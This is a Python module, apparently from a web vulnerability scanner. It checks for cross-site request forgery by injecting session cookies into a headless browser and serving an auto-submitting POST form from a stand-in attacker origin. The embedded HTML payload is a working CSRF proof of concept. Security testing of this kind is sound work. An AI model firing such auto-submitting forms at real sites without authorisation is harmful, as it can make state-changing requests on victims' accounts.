import asyncio
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

from core.state import SessionManager
from core.ui import ph, i, p, s, w, R, G, Y, N, W, C, GY, draw_table


class CSRFVerifier:
    """
    Playwright-assisted CSRF Live Verifier.
    Tests if state-changing POST/PUT/DELETE forms or endpoints can be triggered
    from an isolated cross-origin context using active session cookies.
    """

    def __init__(self, target_url: str, session_manager: SessionManager, forms: Optional[List[Dict]] = None):
        self.target_url = target_url
        self.domain = urlparse(target_url).netloc
        self.session_manager = session_manager
        self.forms = forms or []
        self.findings: List[Dict[str, Any]] = []

    async def run(self) -> List[Dict[str, Any]]:
        if not PLAYWRIGHT_AVAILABLE:
            w("Playwright not installed. Skipping CSRF live browser verification.")
            return []

        ph("CSRF VERIFIER: Live Cross-Origin Browser Test")

        # Get active cookies for target domain
        cookies_dict = getattr(self.session_manager, "cookies", {}).get(self.domain, {})
        if not cookies_dict:
            i(f"{GY}No active session cookies registered for {self.domain}. Skipping authenticated CSRF test.{N}")
            return []

        i(f"Testing {W}{len(cookies_dict)}{N} active cookies against cross-origin auto-submission...")

        try:
            from core.browser_pool import SharedBrowserPool
            context = await SharedBrowserPool.new_context()
            if not context:
                return []

            try:
                # Inject cookies into target origin
                cookies_to_add = []
                clean_domain = self.domain.split(":")[0]
                for k, v in cookies_dict.items():
                    cookies_to_add.append({
                        "name": k,
                        "value": str(v),
                        "domain": clean_domain if clean_domain else "localhost",
                        "path": "/",
                    })
                if cookies_to_add:
                    await context.add_cookies(cookies_to_add)

                page = await context.new_page()

                # Generate Cross-Origin Poc HTML
                attacker_origin = "https://attacker-origin.example"
                html_poc = f"""
                <!DOCTYPE html>
                <html>
                <body>
                    <h1>CSRF PoC Engine</h1>
                    <form id="csrfForm" action="{self.target_url}" method="POST">
                        <input type="hidden" name="test_param" value="verdamt_csrf_test" />
                    </form>
                    <script>
                        document.getElementById('csrfForm').submit();
                    </script>
                </body>
                </html>
                """

                # Intercept request dispatched by auto-submit form
                captured_requests = []

                async def handle_request(request):
                    if self.domain in urlparse(request.url).netloc:
                        req_cookies = request.headers.get("cookie", "")
                        captured_requests.append({
                            "url": request.url,
                            "method": request.method,
                            "headers": request.headers,
                            "cookies_sent": req_cookies,
                        })

                page.on("request", handle_request)

                # Route attacker origin to serve the PoC HTML
                await page.route(f"{attacker_origin}/*", lambda route: route.fulfill(
                    status=200,
                    content_type="text/html",
                    body=html_poc
                ))

                try:
                    await page.goto(f"{attacker_origin}/test.html", wait_until="domcontentloaded", timeout=4000)
                    await page.wait_for_timeout(1000)
                except Exception:
                    pass

                # Analyze captured request
                for req in captured_requests:
                    sent_cookies = req.get("cookies_sent", "")
                    if req["method"].upper() in ["POST", "PUT", "DELETE", "PATCH"] and sent_cookies:
                        # Check SameSite flags or missing Anti-CSRF token
                        self.findings.append({
                            "type": "csrf",
                            "title": "CSRF: Cross-Origin Cookie Auto-Inclusion",
                            "url": self.target_url,
                            "detail": f"Browser automatically attached active session cookies on cross-origin {req['method']} request. Sent cookies: {sent_cookies[:50]}...",
                            "severity": "High",
                            "confidence": "confirmed",
                            "verified_poc": f"Auto-submitting form from {attacker_origin} -> {req['url']}",
                        })
                        s(f"CSRF Confirmed on {C}{self.target_url}{N} (Cookies sent cross-origin)")
            finally:
                await context.close()
        except Exception as e:
            w(f"CSRF verification error: {e}")

        return self.findings
